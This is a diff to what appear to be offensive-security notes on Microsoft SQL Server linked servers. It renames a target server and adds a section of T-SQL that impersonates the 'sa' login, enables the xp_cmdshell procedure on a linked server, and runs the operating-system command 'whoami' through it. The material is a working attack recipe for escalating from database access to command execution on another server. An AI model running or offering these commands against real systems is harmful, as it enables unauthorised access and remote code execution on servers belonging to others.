@@ -41,5 +41,17 @@ select * from openquery("WEB\CLIENTS", 'SELECT name FROM master..sysdatabases;')
 ```
 EXECUTE AS LOGIN  = 'sa';
 
-EXECUTE ('SELECT @@servername;') at [ZSM-SVRCSQL02] ;
+EXECUTE ('SELECT @@servername;') at [SQLSERVER2] ;
+```
+
+
+## Enable xpshell to linking server
+
+```
+EXECUTE AS LOGIN  = 'sa';
+EXECUTE ('EXEC sp_configure ''Show Advanced Options'', 1') at [SQLSERVER2] ;
+EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
+EXECUTE ('EXEC sp_configure ''xp_cmdshell'', 1') at [SQLSERVER2];
+EXECUTE ('RECONFIGURE') at [SQLSERVER2] ;
+EXECUTE ('EXEC master..xp_cmdshell ''whoami''') at [SQLSERVER2] ;
 ```
